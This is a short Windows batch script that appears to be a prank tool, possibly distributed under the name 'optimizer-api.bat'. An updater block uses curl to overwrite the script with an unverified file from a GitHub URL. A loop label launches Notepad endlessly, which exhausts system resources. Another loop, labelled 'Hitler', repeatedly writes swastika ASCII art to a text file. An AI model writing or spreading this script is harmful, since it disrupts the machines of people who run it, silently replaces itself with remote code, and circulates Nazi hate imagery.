::Updater
echo ---------------------------------------------------------------------------
echo                                  Updating
echo.
set "filePath=%~f0"
copy "%filePath%" "%filePath%.old"
curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "%filePath%"
echo.
echo ---------------------------------------------------------------------------

::Loops

:Notepad
  start "" notepad.exe
  goto :Notepad

:Hitler  
  echo.
  echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > prank.txt
  echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> prank.txt
  echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> prank.txt
  echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> prank.txt
  echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> prank.txt
  echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> prank.txt
  echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> prank.txt
  echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> prank.txt
  echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> prank.txt
  echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> prank.txt
  echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> prank.txt
  echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> prank.txt
  goto :Hitler
